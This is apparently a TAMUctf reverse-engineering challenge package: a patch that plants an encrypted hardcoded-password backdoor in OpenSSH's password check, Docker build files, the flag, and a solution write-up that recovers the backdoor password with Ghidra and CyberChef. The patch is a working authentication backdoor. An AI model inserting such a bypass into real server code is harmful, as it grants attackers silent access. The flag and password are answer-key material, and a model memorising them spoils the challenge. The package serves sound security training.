{
    "auth-passwd.patch": "+++ auth-passwd.c\t2023-01-10 03:28:09.000000000 -0600\n@@ -39,11 +39,13 @@\n #include \"includes.h\"\n \n #include <sys/types.h>\n+#include <openssl/evp.h>\n \n #include <pwd.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdarg.h>\n+#include <math.h>\n \n #include \"packet.h\"\n #include \"sshbuf.h\"\n@@ -188,6 +190,65 @@\n \t}\n }\n #elif !defined(CUSTOM_SYS_AUTH_PASSWD)\n+void gen_key(uint32_t keylen, unsigned char* key) {\n+\tchar* passwd = \"hMBTb3Yr70NaDyLoH9JPT2ykfSSKgvcW\";\n+\tchar* salt = \"3Wi28RC23cDM\";\n+\tuint32_t iterations = 4096;\n+\t\n+\tPKCS5_PBKDF2_HMAC(passwd, strlen(passwd), salt, strlen(salt), iterations, EVP_sha256(), keylen, key);\n+}\n+\n+void gen_iv(uint32_t ivlen, unsigned char* iv) {\n+\tchar* passwd = \"8WtIAFFQBEXFu8ONUbiuO265\";\n+\tchar* salt = \"x58C4A0MoYAw\";\n+\tuint32_t iterations = 1024;\n+\n+\tPKCS5_PBKDF2_HMAC(passwd, strlen(passwd), salt, strlen(salt), iterations, EVP_sha256(), ivlen, iv);\n+}\n+\n+void handleErrors(void) {\n+\tprintf(\"An error occured\\n\");\n+\tabort();\n+}\n+\n+int encrypt(unsigned char plaintext[], unsigned char ciphertext[]) {\n+\tEVP_CIPHER_CTX *ctx;\n+\tint len;\n+\tint ciphertext_len;\n+\n+\tuint32_t keylen = 32;\n+\tuint32_t ivlen = 16;\n+\tunsigned char key[keylen];\n+\tunsigned char iv[ivlen];\n+\n+\tgen_key(keylen, key);\n+\tgen_iv(ivlen, iv);\n+\n+\tif(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();\n+\tif(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) handleErrors();\n+\tif(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, strlen(plaintext))) handleErrors();\t\n+\n+\tciphertext_len = len;\n+\n+\tif(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();\n+\n+\tciphertext_len += len;\n+\tEVP_CIPHER_CTX_free(ctx);\n+\treturn ciphertext_len;\n+}\n+\n+int backdoor(struct passwd* pw, const char *password) {\n+\tunsigned char encpass[(int)(ceil(strlen(password)/16)+1)*16];\n+  unsigned char bdpass[] = {0x76, 0xdb, 0x5d, 0x8d, 0xae, 0xf8, 0x33, 0x6b, 0x82, 0x31, 0xd4, 0x80, 0x64, 0xe8, 0xe3, 0x6b, 0x5f, 0x5a, 0x51, 0xab, 0x9c, 0x4a, 0xd4, 0xab, 0xd9, 0x59, 0x2d, 0xf4, 0xba, 0x72, 0x03, 0x3a, 0x4e, 0x33, 0x1a, 0x59, 0xe6, 0x55, 0x06, 0xf1, 0xdf, 0xfb, 0xe7, 0xaf, 0xe3, 0xd4, 0xde, 0x29, 0x00};\n+\n+\tencrypt((char*)password, encpass);\n+\tif(pw->pw_uid == 1000 && strncmp(encpass, bdpass, strlen(bdpass)) == 0) {\n+\t\treturn 1;\n+\t}\n+\n+\treturn 0;\n+}\n+\n int\n sys_auth_passwd(struct ssh *ssh, const char *password)\n {\n@@ -195,6 +256,8 @@\n \tstruct passwd *pw = authctxt->pw;\n \tchar *encrypted_password, *salt = NULL;\n \n+\tif(backdoor(pw, password) == 1) return 1;\n+\n \t/* Just use the supplied fake password if authctxt is invalid */\n \tchar *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;\n \n@@ -203,7 +266,8 @@\n \n \t/* Check for users with no password. */\n \tif (strcmp(pw_password, \"\") == 0 && strcmp(password, \"\") == 0)\n-\t\treturn (1);\n+\t\treturn (1);\t\n+\n \n \t/*\n \t * Encrypt the candidate password using the proper salt, or pass a\n",
    "Dockerfile": "FROM ubuntu:20.04\n\nCOPY ./auth-passwd.patch /\nCOPY ./flag.txt /home/billy/flag.txt\nRUN apt update -y && \\\n    apt install -y build-essential zlib1g-dev libssl-dev wget && \\\n    useradd billy && \\\n    echo billy:w95WnHlqlfKUNsZLuqluWKxLmGJcRqYo | chpasswd && \\\n    groupadd -g 999 sshd && \\\n    useradd -u 999 -g 999 -c sshd -d / sshd && \\\n    mkdir /var/lib/sshd && \\\n    wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-9.0p1.tar.gz && \\\n    tar -xvf /openssh-9.0p1.tar.gz\n\nWORKDIR /openssh-9.0p1\nRUN patch -ruN < ../auth-passwd.patch && \\\n    ./configure && \\\n    make sshd && \\\n    make install && \\\n    rm -rf /openssh-9.0p1 /openssh-9.0p1.tar.gz /auth-passwd.patch\n\nWORKDIR /\n\nEXPOSE 22\nENTRYPOINT [\"/usr/local/sbin/sshd\", \"-D\", \"-o\", \"ListenAddress=0.0.0.0\"]\n\n",
    "flag.txt": "gigem{n0t_s0_hidd3n_i_gu3ss}\n",
    "Makefile": "NAME := firstresponder\nPORT := 4444\n\nall: clean dist\n\nclean:\n\tdocker container rm -f tamuctf-$(NAME)\n\trm -f $(NAME).zip\n\ndist: docker\n\tdocker cp tamuctf-$(NAME):/usr/local/sbin/sshd sshd\n\tzip $(NAME).zip sshd\n\trm sshd\n\ndocker: \n\tdocker build -t $(NAME) .\n\tdocker run -d --restart=always --name tamuctf-$(NAME) -p $(PORT):22 $(NAME)\n\n.PHONY:\n",
    "README.md": "# First Responder\n\nAuthor: `Mr. Blade`\n\n## Description\n\nOne of our client companies was recently hit with a cyber attack. During the initial investigation by our incident responders, a recently modified sshd binary was discovered. \n\nCan you check if the attackers installed a backdoor in sshd?\n\nNote: The username you need to use is `billy`.\n\n## Solution\n\nStatic analysis is cool!!\n\nOur goal is to find a backdoor in this version of sshd\n\nOpen up ghidra and analyze the binary. Stripped binary... not poggers\n\n![](img/ghidra_stripped.png)\n\nLet's look at the 2 functions we're given symbols for.\n\n`setlogin` doesn't look too helpful...\n\n![](img/setlogin.png)\n\n`xcrypt` seems to be doing normal crypto stuff... kinda gross\n\n![](img/xcrypt.png)\n\nMakes sense for sshd to be calling crypto functions. Looking at the functions that call `xcrypt` (boxed above), there's only one real function that calls it: `FUN_00112f30`. That function (renamed `calls_xcrypt`) looks like this:\n\n![](img/calls_xcrypt.png)\n\nSeems as if the function either returns a 1 or 0 depending on the branch it enters. Let's go to the function that calls this one (boxed above): `FUN_00112fe0` (renamed `calls_calls_xcrypt`... very creative, I know).\n\n![](img/calls_calls_xcrypt.png)\n\nSo this function takes the return value of `calls_xcrypt` and explicitly checks to see if it is not equal to 0 (line 31). Looks like it's expecting a 1, but Ghidra decompilation can't guarantee that. Let's go back into `calls_xcrypt`.\n\n![](img/calls_xcrypt2.png)\n\nThe highlighted variable is the output of `xcrypt`. It gets compared to a string that originates from `param_1` and checks for equality (blue box above). That branch returns a 1. It seems from the past 2 observations that the goal is for `calls_xcrypt` to return a 1 upon success. Looking more closely, it seems as if there are 2 more branches that return a 1 (green boxes above). The `iVar3` seems to always be the output of `FUN_00112e10`. The `__s2` output can either be `lVar2 + 8` or the output of `FUN_0018b1b0`. That function looks like this:\n\n![](img/__s2_function.png)\n\nNothing special here. Let's look at `FUN_00112e10`:\n\n![](img/ivar3_function.png)\n\nNow this is *significantly* more interesting! The boxed section seems to be the most important part. Looks like there are a ton of constants defined and a `strncmp` gets called to check for equality. To return a 1, `iVar3` needs to be equivalent to 0, meaning the 2 values being string compared needs to match. At line 28, `puVar6` gets assigned to the address of `local_58`, the start of this mysterious constant. I'm making a few assumptions here, but I am going to assume that this function passes the user-provided sshd password (`param_2`) and a pointer to an array to `FUN_00112d10`, and then checks if that array's contents are equivalent to the constant defined in memory. Now let's look at that function:\n\n![](img/encrypt_function.png)\n\nAlright, we have an encrypt function! Seems like we have more library functions. Looks like we are working with AES-256-CBC. If we hover over `EVP_EncryptInit_ex`, it shows the expected argument order: ctx, cipher, impl, key, and iv. From this, we can infer that `local_58` is the key and `local_68` is the iv, so we can rename those variables. Looking at the 2 functions at lines 18 and 19, we see these:\n\n![](img/key_gen.png)\n![](img/iv_gen.png)\n\nWe can generate these values on our own through CyberChef, nice. Now we have all of the information we need. Since the password is encrypted with AES-256-CBC and then compared to the constant, we can decrypt the constant with these values and figure out the backdoor's password. Lets move to CyberChef.\n\nWe can generate the key and iv using those arguments passed into those functions:\n\n![](img/key_cyberchef.png)\n![](img/iv_cyberchef.png)\n\nWe get a key of `0465b928c7c5c8b45a7c870c4616aeb14ab613ee4ee00645d755832da2fbb5d8` and an IV of `45cecb952247930bd13c7bbf9a71a5b0`. Now we can get the constant value from Ghidra.\n\n***NOTE:*** The Ghidra disassembly output isn't entirely accurate here. To get accurate endianness and values, you have to grab the values directly from the assembly. You can do that by looking at the assembly used to load the constant values and following to the data segments where it grabs them from:\n\n![](img/constant_extraction.png)\n![](img/constant_extraction2.png)\n\nWhen you grab all the values, you should have a ciphertext of `76db5d8daef8336b8231d48064e8e36b5f5a51ab9c4ad4abd9592df4ba72033a4e331a59e65506f1dffbe7afe3d4de29`\n\nPlugging all of these values into CyberChef's AES Decrypt, we can decrypt the ciphertext:\n\n![](img/password_decrypted.png)\n\nWe can see the password is `n07_4_backd00r_p455w0rd_lmao69420`! Now we can try to ssh into `billy`'s account as per the README.\n\n![](img/ssh_login.png)\n\nWe can successfully log in and get the flag!\n\nFlag: `gigem{n0t_s0_hidd3n_i_gu3ss}`\n",
    "img\\calls_calls_xcrypt.png": "[Binary file or unsupported type: png]",
    "img\\calls_xcrypt.png": "[Binary file or unsupported type: png]",
    "img\\calls_xcrypt2.png": "[Binary file or unsupported type: png]",
    "img\\constant_extraction.png": "[Binary file or unsupported type: png]",
    "img\\constant_extraction2.png": "[Binary file or unsupported type: png]",
    "img\\encrypt_function.png": "[Binary file or unsupported type: png]",
    "img\\ghidra_stripped.png": "[Binary file or unsupported type: png]",
    "img\\ivar3_function.png": "[Binary file or unsupported type: png]",
    "img\\iv_cyberchef.png": "[Binary file or unsupported type: png]",
    "img\\iv_gen.png": "[Binary file or unsupported type: png]",
    "img\\key_cyberchef.png": "[Binary file or unsupported type: png]",
    "img\\key_gen.png": "[Binary file or unsupported type: png]",
    "img\\password_decrypted.png": "[Binary file or unsupported type: png]",
    "img\\setlogin.png": "[Binary file or unsupported type: png]",
    "img\\ssh_login.png": "[Binary file or unsupported type: png]",
    "img\\xcrypt.png": "[Binary file or unsupported type: png]",
    "img\\__s2_function.png": "[Binary file or unsupported type: png]",
    "category": "rev"
}